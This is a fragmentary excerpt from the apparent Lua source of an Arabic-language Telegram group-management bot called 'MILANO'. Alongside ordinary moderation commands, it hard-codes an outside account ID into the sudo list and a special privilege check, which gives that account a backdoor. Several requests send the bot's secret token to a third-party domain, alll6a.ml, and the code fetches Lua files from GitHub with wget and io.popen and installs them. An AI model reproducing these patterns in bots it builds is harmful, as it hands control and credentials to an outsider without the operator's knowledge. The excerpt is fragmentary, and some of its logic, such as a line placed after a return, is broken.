...
SUDO = SUDO
sudo_users = {SUDO,1906006212,1906006212}   
print([[
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MilanoSource/Files_MILANO/main/File_Bot/commands.lua") 
...
if tonumber(user_id) == tonumber(1906006212) then  
var = true  
...
local UserName = (data.username_ or "ffhjhhj")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@alll6a")  
...
os.execute('wget https://raw.githubusercontent.com/MilanoSource/MILANO/main/MILANO.lua')
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙[تحديثات البوت](t.me/ffhjhhj) \n⌯︙[قناه السورس](t.me/ffhjhhj)')
end
...
usertext = '*\n ⌯︙العضو »* ['..result.title_..'](t.me/'..(username or 'ffhjhhj')..')'
status  = '\n *⌯︙تم ترقيته مطور*'
...
usertext = '\n *⌯︙العضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'ffhjhhj')..')'
status  = '\n*⌯︙تم ترقيته مطور*'
...
if MILANO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙العضو »* ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ffhjhhj')..') \n ⌯︙'..MILANO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
...
send(msg.chat_id_,0," *⌯︙العضو :* {["..data.first_name_.."](t.me/ffhjhhj)}\n⌯︙["..MILANO_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
...
send(msg.chat_id_,0, " *⌯︙عذرا »* {["..data.first_name_.."](t.me/ffhjhhj)}\n*⌯︙عذرا تم منع الملصق* \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false   
...
bnnaGet(msg.sender_user_id_, alll6a_name)
end
...
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝘀ᴏᴜʀᴄʀ 𝗺𝗶𝗹𝗮𝗻𝗼\n\n[✫  𝗺𝗶𝗹𝗮𝗻𝗼 ᴄʜᴀɴɴᴇʟ](http://t.me/ffhjhhj)\n\n[✫  ɪɴғᴏ sᴏᴜʀᴄᴇ](http://t.me/ffhjhhj)\n\n[✫  𝗺𝗶𝗹𝗮𝗻𝗼 ᴅᴇᴠᴇʟᴏᴘᴇʀ](http://t.me/alll6a)\n\n[✫  ʙᴏᴛ ᴍɪʟᴀɴᴏ](http://t.me/alll6a)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✫ 𝘀ᴏᴜʀᴄʀ 𝗺𝗶𝗹𝗮𝗻𝗼',url="t.me/ffhjhhj/80"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ffhjhhj&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' *⌯︙بواسطه »* ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ffhjhhj')..') \n*⌯︙تـم قفـل الدردشه* ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙بواسطه »* ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ffhjhhj')..') \n*⌯︙تـم قفـل التاك بالكتم* ')
end,nil)   
...
{{text = '  𖣘 ⁽SＯＵＲＣＥ₎ 𖣘 ', url="t.me/ffhjhhj"}},
}  
local msg_id = msg.id_/2097152/0.5  
...
if database:get(bot_id.."alll6a:admin:Time"..msg.chat_id_) then 
return
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'alll6a:admin:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if DevMILANOW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MilanoSource/Files_MILANO/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n *⌯︙اهلا بك في متجر ملفات ميلانو*\n*⌯︙ملفات السورس ↓*\n*•━━━━━━ 𝑴𝑰 ━━━━━━━•*\n\n"
local TextE = "\n*•━━━━━━ 𝑴𝑰 ━━━━━━━•*\n *⌯︙علامة تعني { ✓ } ملف مفعل*\n *⌯︙علامة تعني { ✘ } ملف معطل*\n *⌯︙قناة سورس ميلانو ↓*\n".." *⌯︙*[اضغط هنا لدخول](t.me/ffhjhhj) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MilanoSource/Files_MILANO/main/File_Bot/"..file)
if res == 200 then
...
st = https.request('https://alll6a.ml/Imagelnfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://alll6a.ml/Imagelnfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
local UserName = (b.username_ or "ffhjhhj")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⌯︙لعضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'ffhjhhj')..')'
status  = '\n*⌯︙تم تنزيله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⌯︙العضو »* '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⌯︙العضــو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'ffhjhhj')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⌯︙العضو »* ['..result.title_..'](t.me/'..(text1[3] or 'ffhjhhj')..')'..'\n*⌯︙تم رفعه '..text1[2]..'*')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if not database:get(bot_id..'alll6a:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then   
...
database:setex(bot_id..'alll6a:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'ffhjhhj')..')'
local iduser = result.sender_user_id_
...
zh = https.request('https://alll6a.ml/amirZhfa/Teland.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n*⌯︙قائمه الزخرفه* \nٴ⌯∫ٴ*•━━━━━━ 𝑴𝑰 ━━━━━━━•*ٴ⌯∫○ٴ \n"
i = 0
...
gk = https.request('https://alll6a.ml/amirBrg/Teland.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://alll6a.ml/amirOmr/Teland.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
keyboard = {}  
keyboard.inline_keyboard = {
{{text = '𝑴𝑰𝑳𝑨𝑵𝑶 𝑻𝑬𝑨𝑴', url="t.me/ffhjhhj"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
